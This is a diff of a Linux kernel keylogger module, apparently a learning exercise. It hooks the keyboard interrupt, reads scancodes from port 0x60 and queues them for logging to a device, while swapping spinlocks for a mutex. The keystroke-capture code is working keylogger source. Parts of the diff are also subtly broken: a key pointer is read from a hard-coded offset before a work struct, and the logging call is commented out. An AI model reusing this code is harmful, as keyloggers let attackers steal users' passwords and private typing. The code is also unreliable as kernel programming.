@@ -61,7 +61,7 @@ struct key_log_index {
 
 static struct key_log_index	*key_full_log;
 
-DEFINE_SPINLOCK(lock);
+DEFINE_MUTEX(lock);
 
 static struct key_log_index	*key_log_create_page(struct key_log_index *next)
 {
@@ -251,11 +251,10 @@ static int	open_key(struct inode *node, struct file *file)
 	int	ret;
 
 	pr_info("device open.\n");
-	spin_lock(&lock);
 	pr_info("single open\n");
+	mutex_lock(&lock);
 	ret = single_open(file, &key_prepare_show, NULL);
-	// let's try to only unlock at close...
-	spin_unlock(&lock);
+	mutex_unlock(&lock);
 	return ret;
 }
 
@@ -279,7 +278,6 @@ static ssize_t	write_key(struct file *file, const char __user *buf,
 static int	release_key(struct inode *node, struct file *file)
 {
 	pr_info("device closed\n");
-	spin_unlock(&lock);
 	return single_release(node, file);
 }
 
@@ -342,22 +340,27 @@ static void		key_job(struct work_struct *work)
 {
 	struct key_map		*key;
 
-	key = (void*)((size_t)work + sizeof(*work));
+	// key = (void*)((size_t)work + sizeof(*work));
+	key = *(struct key_map **)((size_t)work - 8);
 	pr_info("logging key in workjob. %p", work);
+	mutex_lock(&lock);
 	// key_create_entry(key);
+	mutex_unlock(&lock);
+
 }
+
+DEFINE_SPINLOCK(irq_lock);
 
 static irqreturn_t	key_handler(int irq, void *dev_id)
 {
 	unsigned int			scancode;
-	struct key_map			*key;
-	size_t				flags;
+	static struct key_map		*key;
 	static struct work_struct	task;
 	static bool			init_done = false;
 
+	spin_lock_irq(&irq_lock);
 	scancode = inb(0x60);
 	key = get_key(scancode & 0x7f);
-	spin_lock_irqsave(&lock, flags);
 	if (key) {
 		key->pressed = (scancode & 0x80) == 0;
 		if (key->pressed)
@@ -368,14 +371,14 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 			INIT_WORK(&task, key_job);
 			init_done = true;
 		}
-		pr_info("origin key: %p -> %p", &task, key);
+		pr_info("origin key: %p -> %p (%p)", &task, key, &key);
 		queue_work(workqueue.work, &task);
 
 	} else {
 		pr_info("(scan: %3u : %3u) -> %s\n", scancode, scancode & 0x7f,
 			((scancode & 0x80) == 0 ? "pressed" : "released"));
 	}
-	spin_unlock_irqrestore(&lock, flags);
+	spin_unlock_irq(&irq_lock);
 	return IRQ_HANDLED;
 }
 
@@ -411,14 +414,14 @@ static void		key_log_print_unified(void)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	spin_lock(&lock);
+	mutex_lock(&lock);
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
 	flush_workqueue(workqueue.work);
 	destroy_workqueue(workqueue.work);
 	key_log_clean();
-	spin_unlock(&lock);
+	mutex_unlock(&lock);
 }
 
 static int		__init hello_init(void)
